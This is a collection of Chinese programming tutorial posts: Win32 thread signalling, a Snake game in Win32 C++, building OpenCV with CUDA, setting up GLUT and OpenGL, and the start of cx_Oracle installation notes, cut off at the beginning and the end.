	printf("OME ID : %u\n",sysInfo.dwOemId);
	printf("Number of processors : %u\n",sysInfo.dwNumberOfProcessors);
	printf("Processor type : %u\n",sysInfo.dwProcessorType);
	printf("Active processor mask : %u\n",sysInfo.dwActiveProcessorMask);
	printf("Page size : %u bytes\n",sysInfo.dwPageSize);

	system("pause");
	return 0;
}



 

可以看到，这款i5处理器支持HT超线程技术。






 
 
// 线程通信机制.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#define  NUM_THREADS 10
#include <windows.h>
#include <stdio.h>
#include <process.h>

typedef struct
{
 int Id;
 HANDLE hTerminate;

}ThreadArgs;

unsigned __stdcall ThreadFunc(void *pArgs)
{
	HANDLE hTerminate = ((ThreadArgs *)pArgs)->hTerminate;//参数转换
	int id = ((ThreadArgs *)pArgs)->Id;

	//运行到我们被告知需要终止的时候
	while(1)
	{
		//检查我们是否需要终止
		if(WaitForSingleObject(hTerminate,0) == WAIT_OBJECT_0)
		{
			//终止线程--我们调用ResetEvent来讲终止的线程返回到非激发状态之后，推出while循环
			printf("Terminating Thread %d \n",id);
			ResetEvent(hTerminate);
			break;
		}
		
		//我们现在可以处理我们的工作，模拟这个情况，假设工作需要1秒钟来做线程需要做的工作

		Sleep(1000);

	}

	_endthreadex(0);

	return 0;

}

int main(int argc ,char * argv[])
{
	unsigned int threadID[NUM_THREADS];
	HANDLE hThread[NUM_THREADS];
	ThreadArgs threadArgs[NUM_THREADS];

	//创建10个线程 
	for(int i =0 ; i < NUM_THREADS ; i++)
	{
		threadArgs[i].Id = i;
		threadArgs[i].hTerminate = CreateEvent(NULL, TRUE, FALSE, NULL);
		hThread[i] = (HANDLE)_beginthreadex(NULL, 0, &ThreadFunc, &threadArgs[i], 0, &threadID[i]);
	}

	printf("To kill a thread (gracefully), press 0-9, then <Enter>.\n");
	printf("Press any other key to exit .\n");

	while (1)
	{
		int c = getc(stdin);
		if (c == '\n')
		{
			continue;
		}
		if (c<'0'||c>'9')
		{
			break;
		}
		SetEvent(threadArgs[c - '0'].hTerminate);
	}
	return 0;
}




 









写程序是一个循序渐进的过程，一开始都是加加减减，修修补补，这和我们做企业做创新的原理都是一样的，没有一蹴而就的成功，最近看了周鸿祎的《我的互联网方法论》蛮有启发，分享给大家几句摘抄： 
1.所有的颠覆式创新都不是敲锣打鼓来的，而是隐藏在一片噪声里。
2.颠覆式创新，就像自然界的新陈代谢一样，不断把老的、旧的公司从行业中挤出去。所以，这种颠覆式创新已经成为美国硅谷的一个象征。破坏和颠覆，都是强调打破原有的平衡，建立新秩序。但这两个词在中文里都是贬义词，因为中国文化崇尚平衡、稳定、和谐。一说颠覆式创新，我们的潜意识就会觉得是反动的东西，就不由自主地想到阶级敌人搞破坏。我有些时候受邀给一些单位讲互联网里的颠覆式创新。讲完后，有的领导就过来跟我握手说：小周，讲得挺好的嘛，只不过以后不要讲颠覆、讲破坏，影响社会和谐。
3.我不赞成企业大张旗鼓地搞创新，非要巨额投入资金，非要设立创新研究院，非要做一个整套的创新战略。我觉得休克式疗法的创新很难成功，我主张把创新从神坛上拉下来，从一些细微点上进行持续创新，这样反而更有效。
4.乔布斯有一天给谷歌高管打电话，说苹果iOS有一个谷歌地图图标，放大多少倍之后，第三行一个像素颜色不对，他认为这影响了iOS的美观。这就是对细节的一种坚持。
下面我们来看一个贪吃蛇的实现代码： 
主要有两个大的步骤： 
1.界面的绘制 
 
2.蛇的绘制 

主要代码：

// Snake.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "Snake.h"
#include <vector>
#include<time.h>

#define MAX_LOADSTRING 100
//定义游戏区 和 控制区大小
#define BOUND_SIZE 10
#define SNACK_SIZE 10
#define GAME_WIDTH  80
#define GAME_HEIGHT 60
#define INFO_WIDTH  30
#define INFO_HEIGHT GAME_HEIGHT

#define MAX_NODE  80 //蛇的最大长度 80 节

#define MY_TIMER 1  //定时器ID
#define DEFAULT_INTERVAL 200 //定义贪食蛇的默认移动速度 500毫秒移动一节
#define PAUSE_ID 1

std::vector<POINT> vSnake;
UCHAR g_ucSnakeLen = 4;
UCHAR g_ucSnakeHead = 4; //vSnack[g_ucSnakeHead-1] 表示蛇头的坐标
UCHAR g_ucSnakeTail = 0; //vSnack[g_ucSnakeTail] 表示蛇尾的坐标
UINT32 g_uiInterval = DEFAULT_INTERVAL; //移动速度
POINT  g_ptDirect = {1, 0}; //移动方向，每次x+1, y不变
POINT  g_ptFoodPos;

BOOL g_bState = TRUE; //游戏是否结束
BOOL g_bNeedFood = TRUE; //是否要投放食物
BOOL g_bPause = FALSE; //暂停


// 全局变量: 
HINSTANCE hInst;                                // 当前实例
TCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPTSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO:  在此放置代码。
    MSG msg;
    HACCEL hAccelTable;

    // 初始化全局字符串
    LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadString(hInstance, IDC_SNAKE, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化: 
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SNAKE));

    // 主消息循环: 
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  函数:  MyRegisterClass()
//
//  目的:  注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEX wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SNAKE));
    wcex.hCursor        = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCE(IDC_SNAKE);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassEx(&wcex);
}

//
//   函数:  InitInstance(HINSTANCE, int)
//
//   目的:  保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
    HWND hWnd;

    hInst = hInstance; // 将实例句柄存储在全局变量中

    hWnd = CreateWindow(szWindowClass, szTitle, WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

    if (!hWnd)
    {
        return FALSE;
    }

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    return TRUE;
}

VOID InitSnack()  //初始化蛇，设定蛇的起始位置
{
    int i;

    vSnake.clear();
    vSnake.resize(MAX_NODE);    

    g_ucSnakeTail = 0;
    g_ucSnakeHead = 4;
    g_ucSnakeLen = 4;
    g_uiInterval = DEFAULT_INTERVAL;

    for (i = 0; i < g_ucSnakeLen; i++)
    {
        //初始化蛇的各个节点
        vSnake[i].x = i;
        vSnake[i].y = 1;
    }
}

POINT &GetSnakeNode(int index) //获取蛇节点位置：倒数第几个节点
{
    int i = g_ucSnakeTail + index;

    if (i >= MAX_NODE)
    {
        i -= MAX_NODE;
    }

    return vSnake[i];
}

VOID DrawSnake(HDC hdc)
{
    int i;
    POINT ptNode;
    HBRUSH hBrush = (HBRUSH)GetStockObject(WHITE_BRUSH);
    SelectObject(hdc, hBrush);
    for (i = 0; i < g_ucSnakeLen; i++)
    {
        //从蛇尾开始画
        ptNode = GetSnakeNode(i);
        Rectangle(hdc, ptNode.x * SNACK_SIZE + BOUND_SIZE,
            ptNode.y * SNACK_SIZE + BOUND_SIZE,
            (ptNode.x + 1) * SNACK_SIZE + BOUND_SIZE,
            (ptNode.y + 1) * SNACK_SIZE + BOUND_SIZE);
    }
}

//移动蛇坐标
VOID RefreshSnake()
{
    //采用翻滚的形式 比如，vSnake[0], vSnake[1],vSnake[2] vSnake[3] 表示蛇的话
    //移动一节后，vSnake[1],vSnake[2] vSnake[3] vSnake[4] 表示蛇
    //vSnake[MAX_NODE -1 ] 后，蛇头存入 vSnake[0]
    POINT ptNewHead; //新的蛇头位置
    POINT ptNode;
    int i;

    ptNewHead.x = GetSnakeNode(g_ucSnakeLen - 1).x + g_ptDirect.x;
    ptNewHead.y = GetSnakeNode(g_ucSnakeLen - 1).y + g_ptDirect.y;

    if (!g_bNeedFood && ptNewHead.x == g_ptFoodPos.x && ptNewHead.y == g_ptFoodPos.y)
    {
        //吃到食物了
        vSnake[g_ucSnakeHead] = ptNewHead;

        g_ucSnakeHead++;
        if (g_ucSnakeHead == MAX_NODE) g_ucSnakeHead = 0;

        g_ucSnakeLen++;

        if (g_ucSnakeLen == MAX_NODE)
        {
            //赢了，事实上，我们不应该等到这个时候才判断赢了
            g_bState = FALSE;
            return;
        }
        g_bNeedFood = TRUE;
        return;
    }

    if (ptNewHead.x < 0 || ptNewHead.x >= GAME_WIDTH || ptNewHead.y < 0 || ptNewHead.y >= GAME_HEIGHT)
    {
        //蛇撞墙了
        g_bState = FALSE;
        return;
    }

    for (i = 1; i < g_ucSnakeLen; i++)
    {
        ptNode = GetSnakeNode(i);
        if (ptNode.x == ptNewHead.x && ptNode.y == ptNewHead.y)
        {
            //蛇撞到自己了
            g_bState = FALSE;
            return;
        }
    }


    vSnake[g_ucSnakeHead].x = ptNewHead.x;
    vSnake[g_ucSnakeHead].y = ptNewHead.y;//新的蛇头

    g_ucSnakeHead++;
    if (g_ucSnakeHead == MAX_NODE) g_ucSnakeHead = 0;

    g_ucSnakeTail++;
    if (g_ucSnakeTail == MAX_NODE) g_ucSnakeTail = 0;

    return;
}

VOID DrawFood(HDC hdc)
{
    int x, y;
    POINT ptNode; 
    int i;
    HBRUSH hBrush = (HBRUSH)GetStockObject(BLACK_BRUSH);

    if (!g_bNeedFood)
    {
        SelectObject(hdc, hBrush);
        Ellipse(hdc, BOUND_SIZE + g_ptFoodPos.x * SNACK_SIZE, 
            BOUND_SIZE + g_ptFoodPos.y * SNACK_SIZE,
            BOUND_SIZE + (g_ptFoodPos.x + 1) * SNACK_SIZE, 
            BOUND_SIZE + (g_ptFoodPos.y + 1) * SNACK_SIZE);
        return;
    }

    srand(time(0)); //随机数种子
    //获取随机坐标，不能是蛇的位置
    while (1)
    {
        x = rand() % GAME_WIDTH;
        y = rand() % GAME_HEIGHT;

        for (i = 0; i < g_ucSnakeLen; i++)
        {
            ptNode = GetSnakeNode(i);
            if (ptNode.x == x && ptNode.y == y)
            {
                break;
            }
        }
        if (i == g_ucSnakeLen) //一直没有break，表示不重复
        {
            break;
        }
    }
    g_bNeedFood = FALSE;
    g_ptFoodPos.x = x;
    g_ptFoodPos.y = y;

    SelectObject(hdc, hBrush);
    Ellipse(hdc, BOUND_SIZE + x * SNACK_SIZE, BOUND_SIZE + y * SNACK_SIZE,
        BOUND_SIZE + (x + 1) * SNACK_SIZE, BOUND_SIZE + (y + 1) * SNACK_SIZE);

    return;
}
//
//  函数:  WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    int wmId, wmEvent;
    PAINTSTRUCT ps;
    HDC hdc;
    RECT rect;
    int i;
    int nWinX, nWinY, nClientX, nClientY;
    HBRUSH hBrush;
    static HWND hPause;

    switch (message)
    {
    case WM_CREATE: //创建窗口时候执行的代码
        GetWindowRect(hWnd, &rect); //获取窗口大小
        nWinX = rect.right - rect.left;
        nWinY = rect.bottom - rect.top;
        GetClientRect(hWnd, &rect); //客户区大小
        nClientX = rect.right - rect.left;
        nClientY = rect.bottom - rect.top;

        //修改窗口大小 客户区大小 + 边框大小 （nWinX-nClientX）
        MoveWindow(hWnd, 0, 0, 
            (GAME_WIDTH + INFO_WIDTH)*SNACK_SIZE + BOUND_SIZE * 3 + (nWinX - nClientX),
            GAME_HEIGHT*SNACK_SIZE + BOUND_SIZE * 2 + (nWinY - nClientY), TRUE);

        hPause = CreateWindow(TEXT("Button"), TEXT("暂停"),
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            3 * BOUND_SIZE + GAME_WIDTH * SNACK_SIZE, 200, 200, 100,
            hWnd, (HMENU)PAUSE_ID, hInst, NULL
            );

        InitSnack();

        SetTimer(hWnd, MY_TIMER, g_uiInterval,NULL); //起一个定时器

        break;
    case WM_TIMER: //定时器到点
        //移动蛇
        RefreshSnake();
        if (!g_bState)
        {
            KillTimer(hWnd, MY_TIMER); //停止计时器
            MessageBox(NULL, TEXT("你输了"), TEXT("FAIL"), MB_OK);
            //InitSnack();
            return 0;
        }
        InvalidateRect(hWnd, NULL, TRUE);
        break;
    case WM_COMMAND:
        wmId    = LOWORD(wParam);
        wmEvent = HIWORD(wParam);
        // 分析菜单选择: 
        switch (wmId)
        {
        case PAUSE_ID:
            if (g_bPause)
            {
                g_bPause = FALSE;
                SetWindowText(hPause, TEXT("暂停"));
                SetTimer(hWnd, MY_TIMER, g_uiInterval, NULL);
            }
            else
            {
                g_bPause = TRUE;
                SetWindowText(hPause, TEXT("继续"));
                KillTimer(hWnd, MY_TIMER);
            }
            break;
        case IDM_ABOUT:
            DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
            break;
        case IDM_EXIT:
            DestroyWindow(hWnd);
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
        break;
    case WM_PAINT:
        hdc = BeginPaint(hWnd, &ps);
        // TODO:  在此添加任意绘图代码...

        hBrush = (HBRUSH)GetStockObject(GRAY_BRUSH);
        SelectObject(hdc, hBrush);

        Rectangle(hdc, BOUND_SIZE, BOUND_SIZE, 
            BOUND_SIZE + GAME_WIDTH*SNACK_SIZE, 
            BOUND_SIZE + GAME_HEIGHT*SNACK_SIZE);

        Rectangle(hdc, BOUND_SIZE * 2 + GAME_WIDTH*SNACK_SIZE  , BOUND_SIZE,
            BOUND_SIZE*2 + (GAME_WIDTH + INFO_WIDTH)*SNACK_SIZE,
            BOUND_SIZE + INFO_HEIGHT*SNACK_SIZE);

        DrawSnake(hdc);

        DrawFood(hdc);

        EndPaint(hWnd, &ps);
        break;
    case WM_KEYDOWN:
        if (!g_bState || g_bPause)
        {
            break;
        }
        switch (wParam)
        {
        case VK_UP: //调节方向：注意点，原来是往上或者往下的话，不做操作
            if (g_ptDirect.x != 0)
            {
                g_ptDirect.x = 0;
                g_ptDirect.y = -1;
            }
            break;
        case VK_DOWN:
            if (g_ptDirect.x != 0)
            {
                g_ptDirect.x = 0;
                g_ptDirect.y = 1;
            }
            break;
        case VK_LEFT:
            if (g_ptDirect.y != 0)
            {
                g_ptDirect.x = -1;
                g_ptDirect.y = 0;
            }
            break;
        case VK_RIGHT:
            if (g_ptDirect.y != 0)
            {
                g_ptDirect.x = 1;
                g_ptDirect.y = 0;
            }
            break;
        }
        break;
    case WM_DESTROY:
        KillTimer(hWnd, MY_TIMER);
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}


 






       

首先说明的是，这个帖子是成功的编译了dll，但是这个dll使用的时候还是很容易出现各种问题的。
发现错误可能是由于系统安装了太多版本的opencv，环境变量的设置混乱，造成dll版本加载不对的问题。
 
      
 更新：下面这篇文章里面有加速编译的设置办法：但是编译器采用了vs2012，我根据他的所有软件版本换了编译器，以及QT库,需要特别注意的是，这些库的相应操作系统版本32bit 或者64bit版本
QT早期版本下载地址：
 
下面这个网址能够找到qt的各个版本
http://download.qt-project.org/archive/qt/
下面是教程地址：
 
http://www.xuebuyuan.com/2108717.html
2014.10.23 
严格根据上文的软件跟库版本是可以编译设置成功的。
 

Motivation:
 
之前在西电跟同学听了图像方面的讲座，受益匪浅啊。人家学校的老师大多都是搞sar雷达图像的，动辄20000*30000的高分辨率。算法再怎么优化，一套流程下来至少算十天半个月。这改个参数算算等不起啊，最后发现搞这个不上GPU根本就不行，于是我想啊讲GPU引入我的这个自然图像处理跟，stereo matching，的graph cuts算法中，应该也能够得到性能的大幅度提升。
 
由于之前一直在看OpenCV这个图像处理库的相关内容，所以先搜了一下看看OpenCV这个库有没有直接对CUDA加速进行支持的，我打开电脑一看OpenCV的dll库后面的后缀带了_gpu就直接贴了代码在那调试呢。结果是，小白了。自己要安装CUDA toolkit并且结合OpenCV编译一遍的。
 
由于我的笔记本电脑是神舟的，显卡是NVIDIA GTX 765我也没看，直接去官网下了个最新的CUDA TOOLKIT 6.5就开始整了，最后发现，人家有专门针对笔记本的notebook版本的，傻了一天白干了，之后发现这个版本过高，还是下了notebook的5.5版本。
 
最新的6.5可能是给8系，9系的新卡用的吧，我也不是很清楚，最后搞完这一套配置终于明白为啥，linux之父最讨厌nvidia了，这程序之间也是乱七八糟的关系兼容不兼容的，官网早期版本的sdk都找不到，哎。。。
 
 

使用Cmake的时候，有几点要注意的，选择Visual Studio 2010的版本应该为win64这样在win7 64bit版本下面生成的OpenCV才是正确的。
 
 

 
 
vs2010主要有两种模式，分别是debug 和 release。 模式可以通过如图所示的位置选择。需要注意的是，因为先前我们cmake采用的是64位VS10编译器，在这里需要选择编译器x64, 而不是win32， 否则会出错。
 
 
整体的过程参考了下面的链接：
http://www.xuebuyuan.com/722557.html
http://blog.csdn.net/fengbingchun/article/details/9831837
 
安装完成后，在系统环境里面会发现新添加了两个环境变量：（环境变量挨个添加吧，不要怕麻烦）
CUDA_PATH = C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v5.0\
CUDA_PATH_V5_0 = C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v5.0\
 
 
手动配置环境变量。在系统环境变量中新建如下项：
CUDA_SDK_PATH = C:\ProgramData\NVIDIA Corporation\CUDA Samples\v5.0
CUDA_LIB_PATH = %CUDA_PATH%\lib\X64
CUDA_BIN_PATH = %CUDA_PATH%\bin
CUDA_SDK_LIB_PATH = %CUDA_SDK_PATH%\common\lib\x64
CUDA_SDK_BIN_PATH = %CUDA_SDK_PATH%\bin\win64
 
 
然后在系统环境变量Path 后添加如下内容：


;%CUDA_LIB_PATH%;%CUDA_BIN_PATH%;%CUDA_SDK_LIB_PATH%;%CUDA_SDK_BIN_PATH%;
 
 
3. 安装TBB
去http://threadingbuildingblocks.org/download 下载tbb41_20130314oss_win.zip解压到某路径
本人D:\tbb41_20130314oss
添加环境变量D:\tbb41_20130314oss\bin\intel64\vc10
 
 
编译过程有两点，可能出现：
1.配置的时候别忘了：添加两个路径，尤其是OpenCV的一个lib库不然 编译有的库找不到，编译不成功。
 
 
这个库不需要设置！！！（后来发现！！！）

 
 
 
2.整个编译的过程非常的缓慢，并且出现在编译OpenCV_gpu这个模块的时候，出现c4819错误感觉非常影响速度，这个你要回到相应的cuda文件中，另存为unicode格式就好
 
 

i7的处理器大概能编译3个小时左右。。。
 
加速方法，可以缩短到一个小时左右！就是只针对响应的显卡版本进行设置：
由于这样直接生成的解决方案需对不同的GPU架构分别编译，编译时间过长（数小时），
建议针对所用显卡进行配置（据称可达原时间六分之一）：
找到如下两项
 
 
 

 
 
清空CUDA_ARCH_PTX，将CUDA_ARCH_BIN中仅保留所需GPU架构，
确定所需架构，请查询https://developer.nvidia.com/cuda-gpus重新configure。（建议使用以上方法先编译一边，确定没有错误，再为所有架构重新编译，花了四天的时间得到的教训）
 
 
 
 



 

 
 
以上是转载的内容，这里要说几个需要注意的地方：
 
 
1.本文中采用的是Cmake2.8.8版本，我用过2.8.12就会出现过很多本文中未提到的错误；
 
2.上文中提到的CUDA_BUILD_CBUIN”、“CUDA_VERBOSE_BUILD（好像是这些），有些其实在Cmake配置和生成的过程中是找不到的，不过这并不影响结果，可以忽略；
 
3.关于tbb路径下x86和x64版本lib的选择问题：如果你的vs是32位的就选择x86的库，否则选x64的库；
 
4.将编译好的头文件、库等加载到程序中时，注意要使用编译的Release版本（形如："opencv_gpu243.lib"，243后没有d的就是Release版本，有的就是Debug版本），否则会产生“应用程序无法正常启动0xc000007b”的错误
 
 
测试代码：
 
<span style="font-size:18px;">// first.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include "opencv2/opencv.hpp"
#include "opencv2/gpu/gpu.hpp"

#pragma comment(lib,"opencv_gpu2410.lib")
#pragma comment(lib,"opencv_core2410.lib")

using namespace std; 
using namespace cv; 
using namespace cv::gpu;
int main()
{
	int i;
	try
	{
		cout << getCudaEnabledDeviceCount();
	}
	catch(const cv::Exception& ex)
	{
		cout << "Error:" << ex.what() <<endl;
	}
	system("PAUSE");
	return 0;
}
</span>
 
 
 
 
 
 
实际上，最后配置好了之后，还是各种问题，我觉的直接调用编译好的opencv加上cuda的库编程效率不是很好，通用性也存在问题。后来觉的引起这个问题的原因是自己电脑上安装的东西太多了，opencv就装了3个版本，环境变量设置的太多了，引起很多问题。
 
 
参考下面这个文章的第三种办法，后面再试试：
http://www.cnblogs.com/dwdxdy/p/3528711.html






glut下载地址: 
http://www.opengl.org/resources/libraries/glut/glutdlls37beta.zip
 
或者：http://user.xmission.com/~nate/glut.html
 
 
 
1. 把解压得到的glut.h放到"C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Include\gl"（与具体安装位置有关，应该是 安装目录\microsoft sdks\windows\v7.0A\include\gl）
      2. 把解压得到的glut.lib和glut32.lib放到"“Programfiles(x86)\Microsoft Visual studio 10.0\VC\lib" 中（与具体安装位置有关，同上）
      3. 把解压得到的glut.dll放到"C:\Windows\System32"
      4. 把glut32.dll放到“Programfiles(x86)\Microsoft Visual studio 10.0\VC\bin”下(注意这个，网上有人说放到system32里，但是我试过，会报错)（与具体安装位置有关，同上）
      5. 打开vs2010,随便打开或新建一个项目。 选择 project->project property-> Configuration Properties->Linker->Input->Additional Dependencies 在其中添加opengl32.lib glu32.lib glut32.lib
 
// first_test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<Windows.h>
#include <stdio.h>
//#include "glut.h"//这种写法就把头文件dll,lib都放到本地文件就行了
#include <gl/glut.h>

void run()
{
	
	
	const GLubyte* name = glGetString(GL_VENDOR); //返回负责当前OpenGL实现厂商的名字
	const GLubyte* biaoshifu = glGetString(GL_RENDERER); //返回一个渲染器标识符，通常是个硬件平台
	const GLubyte* OpenGLVersion =glGetString(GL_VERSION); //返回当前OpenGL实现的版本号
	const GLubyte* gluVersion= gluGetString(GLU_VERSION); //返回当前GLU工具库版本
	printf("OpenGL实现厂商的名字：%s\n", name);
	printf("渲染器标识符：%s\n", biaoshifu);
	printf("OOpenGL实现的版本号：%s\n",OpenGLVersion );
	printf("OGLU工具库版本：%s\n", gluVersion);
	
}



//#include<gl/glu.h>　　//glut.h自动包含了glu.h 和 gl.h

//#include<gl/gl.h>



void renderScene(void)

{

	glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

	glLoadIdentity();

	glBegin(GL_TRIANGLES);

	glVertex3f(-0.5,-0.5,0.0);

	glVertex3f(0.5,0.0,0.0);

	glVertex3f(0.0,0.5,0.0);

	glEnd();

	glutSwapBuffers();

}



int _tmain(int argc, _TCHAR* argv[])

{

	glutInit(&argc,(char** )argv);
	//显示模式初始化
	glutInitDisplayMode(GLUT_DOUBLE|GLUT_RGBA|GLUT_DEPTH);
	//定义窗口大小
	glutInitWindowSize(300,300);
	//定义窗口位置
	glutInitWindowPosition(100,100);
	//创建窗口
		
	glutCreateWindow("Hello OpenGL");

	glutDisplayFunc(renderScene);

	
	run();
	

	glutMainLoop();//enters the GLUT event processing loop.

	return 0;

}



 
 

首先，需要包含头文件#include <GL/glut.h>，这是GLUT的头文件。
本来OpenGL程序一般还要包含<GL/gl.h>和<GL/glu.h>，但GLUT的头文件中已经自动将这两个文件包含了，不必再次包含。
然后看main函数。
int main(int argc, char *argv[])，这个是带命令行参数的main函数，各位应该见过吧？没见过的同志们请多翻翻书，等弄明白了再往下看。
注意main函数中的各语句，除了最后的return之外，其余全部以glut开头。这种以glut开头的函数都是GLUT工具包所提供的函数，下面对用到的几个函数进行介绍。
1、glutInit，对GLUT进行初始化，这个函数必须在其它的GLUT使用之前调用一次。其格式比较死板，一般照抄这句glutInit(&argc, argv)就可以了。
2、 glutInitDisplayMode，设置显示方式，其中GLUT_RGB表示使用RGB颜色，与之对应的还有GLUT_INDEX（表示使用索引颜色）。GLUT_SINGLE表示使用单缓冲，与之对应的还有GLUT_DOUBLE（使用双缓冲）。更多信息，请自己Google。当然以后的教程也会有一些讲解。
3、glutInitWindowPosition，这个简单，设置窗口在屏幕中的位置。
4、glutInitWindowSize，这个也简单，设置窗口的大小。
5、glutCreateWindow，根据前面设置的信息创建窗口。参数将被作为窗口的标题。注意：窗口被创建后，并不立即显示到屏幕上。需要调用glutMainLoop才能看到窗口。
6、glutDisplayFunc，设置一个函数，当需要进行画图时，这个函数就会被调用。（这个说法不够准确，但准确的说法可能初学者不太好理解，暂时这样说吧）。
7、glutMainLoop，进行一个消息循环。（这个可能初学者也不太明白，现在只需要知道这个函数可以显示窗口，并且等待窗口关闭后才会返回，这就足够了。）
在glutDisplayFunc函数中，我们设置了“当需要画图时，请调用myDisplay函数”。于是myDisplay函数就用来画图。观察myDisplay中的三个函数调用，发现它们都以gl开头。这种以gl开头的函数都是OpenGL的标准函数，下面对用到的函数进行介绍。
1、glClear，清除。GL_COLOR_BUFFER_BIT表示清除颜色，glClear函数还可以清除其它的东西，但这里不作介绍。
2、glRectf，画一个矩形。四个参数分别表示了位于对角线上的两个点的横、纵坐标。
3、glFlush，保证前面的OpenGL命令立即执行（而不是让它们在缓冲区中等待）。其作用跟fflush(stdout)类似。
 
 
如果这样还报错的话应该注意以下几点:
有时候在建console application 的时候添加的cpp文件将后缀句改为 .c
有的程序需要glaux工具包，这个下载了，可以按上述步骤添加（操作基本相同）
 
 
主要整合了下面两个帖子：
 
http://www.cnblogs.com/moiyer/archive/2011/11/06/2316156.html
 
http://lesmatines.blog.163.com/blog/static/17396142013113111934550/
 
 
 
 









0.序言
项目主要使用oracle但是我不太喜欢其他编程语言，加上可能需要用python部署算法包，从oracle表中读出数据，处理完成后在放回oracle中去，所以在windows上就想到先用python试一下，自然搜到了cx_oracle（一个按照Python DB API的oracle的实现，如MySQL、PostgreSQL等，只需要安装相应的软件包即可，流程及操作接口都与cx_Oracle基本一致），下面就简单解释一下怎么用这个包进行增删改查。
1.windows 10 安装cx_Oracle注意事项
前提条件是机器本身安装好oracle client（我的机器已经安装好了），并且，oracle client版本cx_oracle版本，cx_oracle和python版本需要对应。
1.1 oracle client版本
如果windows系统没有安装oracle client 需要首先在：
http://www.oracle.com/technetwork/topics/winx64soft-089540.html
下载对应的版本，我的系统是windows10 
查看系统的中的oracle client版本，使用sql/plus命令：

sqlplus -vSQL*Plus:


在安装好cx_oracle后 
使用cx_Oracle.clientversion()查看为(11, 2, 0, 4, 0)
1.2 cx_oracle版本
cx_oracle和python版本需要对应， 
我操作系统的版本是64位，所以上述软件采用的都是64位安装程序。python安装的版本是3.5.2
tnsnames.ora文件我并没有配置？不知道是不是之前系统配置过了，或者是直接移动dll可以不用配置此文件。(期待大牛指导，我还不知道这个是弄啥的)
1.3 使用python模块cx_oracle链接oracle
C:\Users\123456>sqlplus -vSQl*Plus: 
SQL*Plus: Release 11.2.0.2.0 Production 
上述oracle client 版本为11.2，所以需要在https://pypi.python.org/pypi/cx_Oracle/5.2.1

下载cx_Oracle-5.2.1-11g.win-amd64-py3.5.exe，安装运行， 
注意，windows版本使用pip安装的话可能会出错，所以推荐使用上述方式安装 
将：
http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html
下载的安装包中的： instantclient-basic-windows.x64-11.2.0.4.0 
oci.dll此dll依赖下面两个dll（不然运行时候要出现：unable to acquire oracle environment handle）

ocijdbc11.dll 
  oraociei11.dll

复制到：C:\Python35\Lib\site-packages下

2. Redhat linux 6.5 下安装cx_Oracle
